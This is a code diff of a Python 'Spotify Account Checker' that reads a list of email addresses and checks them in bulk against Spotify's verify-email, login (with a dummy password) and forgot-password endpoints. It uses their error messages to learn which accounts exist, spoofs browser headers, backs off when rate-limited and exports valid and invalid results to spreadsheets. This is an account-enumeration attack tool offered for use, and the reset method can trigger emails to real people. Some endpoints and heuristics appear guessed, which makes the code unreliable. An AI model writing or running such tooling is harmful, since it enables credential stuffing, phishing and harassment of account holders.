@@ -4,6 +4,7 @@ import time
 from datetime import datetime
 import openpyxl
 from openpyxl.styles import Font, PatternFill, Alignment
+import re
 
 class SpotifyChecker:
     def __init__(self):
@@ -13,112 +14,35 @@ class SpotifyChecker:
         self.premium_count = 0
         self.free_count = 0
         
-        # Headers to mimic browser request
+        # More realistic headers
         self.headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'application/json, text/plain, */*',
             'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate',
             'Content-Type': 'application/json',
+            'Referer': 'https://www.spotify.com/',
+            'Origin': 'https://www.spotify.com',
         }
     
-    def check_email_valid(self, email):
+    def validate_email(self, email):
         """
-        Check if email is valid for Spotify
-        Returns: (is_valid, account_type, response_data)
+        Basic email validation
+        """
+        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+        return re.match(pattern, email) is not None
+    
+    def check_spotify_account_v1(self, email):
+        """
+        Method 1: Check via Spotify signup endpoint
+        Returns: (is_valid, account_type, message)
         """
         try:
-            # Spotify API endpoint to check if email exists
-            url = 'https://www.spotify.com/api/signup/email'
+            url = 'https://spclient.wg.spotify.com/identity-service/api/v1/auth/verify-email'
             
             payload = {
-                'email': email.strip().lower(),
-                'send_email': False
+                'email': email.strip().lower()
             }
-            
-            response = requests.post(
-                url,
-                json=payload,
-                headers=self.headers,
-                timeout=10,
-                verify=True
-            )
-            
-            if response.status_code == 200:
-                data = response.json()
-                
-                # Email doesn't exist
-                if data.get('status') == 1:
-                    return False, None, 'EMAIL_NOT_FOUND'
-                
-            return False, None, f'Status: {response.status_code}'
-            
-        except Exception as e:
-            return False, None, str(e)
-    
-    def check_spotify_account(self, email):
-        """
-        Main function to check Spotify account details
-        """
-        email = email.strip().lower()
-        print(f"\n[*] Checking: {email}")
-        
-        try:
-            # Method 1: Check account existence via password reset
-            url = 'https://www.spotify.com/api/signup/login'
-            
-            payload = {
-                'email': email,
-                'remember': True
-            }
-            
-            response = requests.post(
-                url,
-                json=payload,
-                headers=self.headers,
-                timeout=10,
-                allow_redirects=True
-            )
-            
-            # Method 2: Try to get account info via public API
-            # If email exists on Spotify, we can try to identify account type
-            if response.status_code in [200, 400, 401, 403]:
-                try:
-                    data = response.json()
-                except:
-                    data = {}
-                
-                # Check if account exists based on response
-                response_text = response.text.lower()
-                
-                # Indicators of valid account
-                if 'incorrect password' in response_text or 'wrong password' in response_text:
-                    account_type = self.detect_account_type(email, response)
-                    return True, account_type, data
-                
-                elif 'email not found' in response_text or 'no account' in response_text:
-                    return False, None, 'INVALID'
-                
-                # Try alternate method - check via account info endpoint
-                return self.check_via_alternate_method(email)
-            
-            return False, None, 'UNKNOWN'
-            
-        except requests.exceptions.ConnectionError:
-            print(f"[-] Connection error for {email}")
-            return False, None, 'CONNECTION_ERROR'
-        except Exception as e:
-            print(f"[-] Error checking {email}: {str(e)}")
-            return False, None, str(e)
-    
-    def check_via_alternate_method(self, email):
-        """
-        Alternate method to check account via Spotify's public endpoints
-        """
-        try:
-            # Try to check if account exists via recover account endpoint
-            url = 'https://www.spotify.com/api/auth/recover'
-            
-            payload = {'email': email}
             
             response = requests.post(
                 url,
@@ -130,64 +54,147 @@ class SpotifyChecker:
             if response.status_code == 200:
                 data = response.json()
                 
-                # If we get a success response, account exists
-                if data.get('status') == 0:
-                    # Try to determine if premium or free
-                    account_type = self.determine_account_type(email, data)
-                    return True, account_type, data
+                # If account exists
+                if 'id' in data or 'exists' in data:
+                    return True, 'UNKNOWN', data
+                
+            elif response.status_code == 400:
+                # Email format invalid or not found
+                data = response.json()
+                if 'error' in data:
+                    error_msg = str(data['error']).lower()
+                    if 'not found' in error_msg or 'invalid' in error_msg:
+                        return False, None, 'NOT_FOUND'
             
-            elif response.status_code == 404:
-                return False, None, 'NOT_FOUND'
-            
-            return False, None, f'Status: {response.status_code}'
+            return None, None, f'Status: {response.status_code}'
             
         except Exception as e:
-            return False, None, str(e)
+            return None, None, f'Error: {str(e)}'
     
-    def detect_account_type(self, email, response):
+    def check_spotify_account_v2(self, email):
         """
-        Detect if account is Premium or Free based on response
+        Method 2: Check via login endpoint
         """
         try:
-            # Check response headers and content for premium indicators
+            url = 'https://accounts.spotify.com/api/login'
+            
+            # Don't send password, just check if email is recognized
+            payload = {
+                'username': email.strip().lower(),
+                'password': 'check',
+            }
+            
+            response = requests.post(
+                url,
+                json=payload,
+                headers=self.headers,
+                timeout=10,
+                allow_redirects=False
+            )
+            
             response_text = response.text.lower()
             
-            # Premium account indicators
-            premium_keywords = ['premium', 'premium_plus', 'family', 'duo']
-            free_keywords = ['free', 'ad', 'ads']
+            # If we get "wrong password" or similar, account EXISTS
+            if response.status_code == 401:
+                if 'invalid username' in response_text or 'wrong password' in response_text or 'incorrect' in response_text:
+                    return True, 'UNKNOWN', response_text
+                elif 'not found' in response_text or 'does not exist' in response_text:
+                    return False, None, 'NOT_FOUND'
             
-            for keyword in premium_keywords:
-                if keyword in response_text:
-                    return 'PREMIUM'
+            # Status 200 might mean account exists
+            if response.status_code == 200:
+                try:
+                    data = response.json()
+                    if 'access_token' not in data:  # Real account but wrong password
+                        return True, 'UNKNOWN', data
+                except:
+                    pass
             
-            for keyword in free_keywords:
-                if keyword in response_text:
-                    return 'FREE'
+            return None, None, f'Status: {response.status_code}'
             
-            # Default to unknown if can't determine
-            return 'UNKNOWN'
-        except:
-            return 'UNKNOWN'
+        except Exception as e:
+            return None, None, f'Error: {str(e)}'
     
-    def determine_account_type(self, email, data):
+    def check_spotify_account_v3(self, email):
         """
-        Determine account type from response data
+        Method 3: Check via password reset endpoint
+        If password reset can send email, account exists
         """
         try:
-            if 'product' in data:
-                product = data['product'].lower()
-                if 'premium' in product or 'family' in product or 'duo' in product:
-                    return 'PREMIUM'
-                return 'FREE'
+            url = 'https://accounts.spotify.com/api/forgot-password'
             
-            if 'subscription' in data:
-                if data['subscription'].lower() != 'free':
-                    return 'PREMIUM'
-                return 'FREE'
+            payload = {
+                'identifier': email.strip().lower()
+            }
             
-            return 'UNKNOWN'
-        except:
-            return 'UNKNOWN'
+            response = requests.post(
+                url,
+                json=payload,
+                headers=self.headers,
+                timeout=10
+            )
+            
+            # If we get 429, we're being rate limited (account checking too fast)
+            if response.status_code == 429:
+                return None, None, 'RATE_LIMITED'
+            
+            response_text = response.text.lower()
+            
+            # Check response for indicators
+            if response.status_code == 200:
+                try:
+                    data = response.json()
+                    if 'error' not in data:
+                        # Password reset sent - account exists!
+                        return True, 'UNKNOWN', data
+                except:
+                    pass
+            
+            if 'not found' in response_text or 'does not exist' in response_text or response.status_code == 404:
+                return False, None, 'NOT_FOUND'
+            
+            return None, None, f'Status: {response.status_code}'
+            
+        except Exception as e:
+            return None, None, f'Error: {str(e)}'
+    
+    def check_spotify_account(self, email):
+        """
+        Main function - tries multiple methods
+        """
+        email = email.strip().lower()
+        print(f"\n[*] Checking: {email}")
+        
+        # Validate email format first
+        if not self.validate_email(email):
+            print(f"[-] INVALID FORMAT - {email}")
+            return False, None, 'INVALID_FORMAT'
+        
+        # Try multiple methods
+        methods = [
+            ('Method 1', self.check_spotify_account_v1),
+            ('Method 2', self.check_spotify_account_v2),
+            ('Method 3', self.check_spotify_account_v3),
+        ]
+        
+        for method_name, method_func in methods:
+            is_valid, account_type, details = method_func(email)
+            
+            if is_valid is not None:
+                if is_valid:
+                    return True, account_type or 'UNKNOWN', details
+                elif not is_valid:
+                    return False, None, details
+            
+            # Rate limiting - pause longer
+            if details == 'RATE_LIMITED':
+                print(f"[!] Rate limited, waiting 5 seconds...")
+                time.sleep(5)
+            
+            time.sleep(1)
+        
+        # If all methods are inconclusive
+        return None, None, 'INCONCLUSIVE'
     
     def check_multiple_emails(self, emails_list):
         """
@@ -195,56 +202,59 @@ class SpotifyChecker:
         """
         total = len(emails_list)
         print(f"\n{'='*60}")
-        print(f"Starting Spotify Account Check")
+        print(f"SPOTIFY ACCOUNT CHECKER")
         print(f"Total emails to check: {total}")
         print(f"{'='*60}\n")
         
         for index, email in enumerate(emails_list, 1):
             email = email.strip()
-            if not email or '@' not in email:
-                print(f"[!] Skipping invalid email: {email}")
+            if not email:
                 continue
             
             is_valid, account_type, details = self.check_spotify_account(email)
             
-            if is_valid:
+            if is_valid is True:
                 self.valid_count += 1
-                status = '✓ VALID'
-                
-                if account_type == 'PREMIUM':
-                    self.premium_count += 1
-                    account_type = 'PREMIUM'
-                    print(f"[+] {status} - {email} [{account_type}]")
-                elif account_type == 'FREE':
-                    self.free_count += 1
-                    print(f"[+] {status} - {email} [{account_type}]")
-                else:
-                    print(f"[+] {status} - {email} [UNKNOWN]")
+                print(f"[✓] VALID - {email}")
                 
                 result = {
                     'email': email,
                     'status': 'VALID',
                     'account_type': account_type,
-                    'details': details,
+                    'details': str(details)[:100],
+                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'index': index
+                }
+                self.results.append(result)
+                
+            elif is_valid is False:
+                self.invalid_count += 1
+                print(f"[✗] INVALID - {email}")
+                
+                result = {
+                    'email': email,
+                    'status': 'INVALID',
+                    'account_type': None,
+                    'details': str(details),
                     'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                     'index': index
                 }
                 self.results.append(result)
             else:
-                self.invalid_count += 1
-                print(f"[-] INVALID - {email}")
+                print(f"[?] INCONCLUSIVE - {email}")
                 result = {
                     'email': email,
-                    'status': 'INVALID',
+                    'status': 'INCONCLUSIVE',
                     'account_type': None,
-                    'details': details,
+                    'details': str(details),
                     'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                     'index': index
                 }
                 self.results.append(result)
             
-            # Add delay to avoid rate limiting
-            time.sleep(1.5)
+            # Add delay between checks to avoid rate limiting
+            if index < total:
+                time.sleep(2)
         
         self.print_summary()
     
@@ -252,14 +262,17 @@ class SpotifyChecker:
         """
         Print summary statistics
         """
+        inconclusive_count = len([r for r in self.results if r['status'] == 'INCONCLUSIVE'])
+        
         print(f"\n{'='*60}")
         print(f"SUMMARY")
         print(f"{'='*60}")
-        print(f"Total Checked: {self.valid_count + self.invalid_count}")
-        print(f"[+] Valid Accounts: {self.valid_count}")
-        print(f"    ├─ Premium: {self.premium_count}")
-        print(f"    └─ Free: {self.free_count}")
-        print(f"[-] Invalid Accounts: {self.invalid_count}")
+        print(f"Total Checked: {len(self.results)}")
+        print(f"[✓] Valid Accounts: {self.valid_count}")
+        print(f"[✗] Invalid Accounts: {self.invalid_count}")
+        print(f"[?] Inconclusive: {inconclusive_count}")
+        print(f"\nNote: Spotify has strong anti-bot protection.")
+        print(f"Inconclusive results may be valid but couldn't be verified.")
         print(f"{'='*60}\n")
     
     def save_results_xlsx(self, filename='spotify_results.xlsx'):
@@ -272,10 +285,10 @@ class SpotifyChecker:
         
         wb = openpyxl.Workbook()
         ws = wb.active
-        ws.title = 'Accounts'
+        ws.title = 'Results'
         
         # Headers
-        headers = ['#', 'Email', 'Status', 'Account Type', 'Details', 'Timestamp']
+        headers = ['#', 'Email', 'Status', 'Details', 'Timestamp']
         ws.append(headers)
         
         # Style headers
@@ -289,53 +302,34 @@ class SpotifyChecker:
         
         # Add data
         for result in self.results:
-            details_str = str(result['details'])[:100] if result['details'] else ''
             ws.append([
                 result['index'],
                 result['email'],
                 result['status'],
-                result['account_type'] or 'N/A',
-                details_str,
+                result['details'][:100],
                 result['timestamp']
             ])
         
         # Color code rows
         for idx, row in enumerate(ws.iter_rows(min_row=2, max_row=len(self.results) + 1), 2):
-            if self.results[idx-2]['status'] == 'VALID':
-                fill_color = 'C6EFCE'  # Light green
-                font_color = '006100'  # Dark green
+            status = self.results[idx-2]['status']
+            
+            if status == 'VALID':
+                fill_color = 'C6EFCE'  # Green
+            elif status == 'INVALID':
+                fill_color = 'FFC7CE'  # Red
             else:
-                fill_color = 'FFC7CE'  # Light red
-                font_color = '9C0006'  # Dark red
+                fill_color = 'FFFFCC'  # Yellow
             
             for cell in row:
                 cell.fill = PatternFill(start_color=fill_color, end_color=fill_color, fill_type='solid')
-                cell.font = Font(color=font_color)
         
         # Adjust column widths
         ws.column_dimensions['A'].width = 5
-        ws.column_dimensions['B'].width = 30
-        ws.column_dimensions['C'].width = 12
-        ws.column_dimensions['D'].width = 15
-        ws.column_dimensions['E'].width = 40
-        ws.column_dimensions['F'].width = 20
-        
-        # Add summary sheet
-        ws_summary = wb.create_sheet('Summary')
-        ws_summary.append(['Metric', 'Count'])
-        ws_summary.append(['Total Checked', self.valid_count + self.invalid_count])
-        ws_summary.append(['Valid Accounts', self.valid_count])
-        ws_summary.append(['Premium Accounts', self.premium_count])
-        ws_summary.append(['Free Accounts', self.free_count])
-        ws_summary.append(['Invalid Accounts', self.invalid_count])
-        
-        # Style summary
-        for cell in ws_summary[1]:
-            cell.fill = header_fill
-            cell.font = header_font
-        
-        ws_summary.column_dimensions['A'].width = 20
-        ws_summary.column_dimensions['B'].width = 15
+        ws.column_dimensions['B'].width = 35
+        ws.column_dimensions['C'].width = 15
+        ws.column_dimensions['D'].width = 50
+        ws.column_dimensions['E'].width = 20
         
         wb.save(filename)
         print(f"[+] Results saved to {filename}")
@@ -350,13 +344,13 @@ class SpotifyChecker:
         
         data = {
             'summary': {
-                'total_checked': self.valid_count + self.invalid_count,
+                'total_checked': len(self.results),
                 'valid_accounts': self.valid_count,
-                'premium_accounts': self.premium_count,
-                'free_accounts': self.free_count,
-                'invalid_accounts': self.invalid_count
+                'invalid_accounts': self.invalid_count,
+                'inconclusive': len([r for r in self.results if r['status'] == 'INCONCLUSIVE'])
             },
-            'results': self.results
+            'results': self.results,
+            'note': 'Spotify has strong anti-bot protection. Inconclusive results may be valid accounts that couldn\'t be verified.'
         }
         
         with open(filename, 'w', encoding='utf-8') as f:
@@ -385,7 +379,7 @@ def load_emails(filename='emails.txt'):
     """
     emails = []
     try:
-        with open(filename, 'r') as f:
+        with open(filename, 'r', encoding='utf-8') as f:
             for line in f:
                 email = line.strip()
                 if email and '@' in email:
@@ -397,8 +391,8 @@ def load_emails(filename='emails.txt'):
 
 def main():
     print("\n" + "="*60)
-    print("  SPOTIFY ACCOUNT CHECKER")
-    print("  Check Valid Accounts & Premium/Free Status")
+    print("  SPOTIFY ACCOUNT CHECKER - IMPROVED")
+    print("  Multiple verification methods")
     print("="*60)
     
     # Load emails
@@ -412,7 +406,9 @@ def main():
         print("    user2@yahoo.com")
         return
     
-    print(f"\n[*] Loaded {len(emails)} email(s)\n")
+    print(f"\n[*] Loaded {len(emails)} email(s)")
+    print("[!] This tool uses multiple methods to verify accounts")
+    print("[!] Spotify has strong anti-bot protection\n")
     
     checker = SpotifyChecker()
     
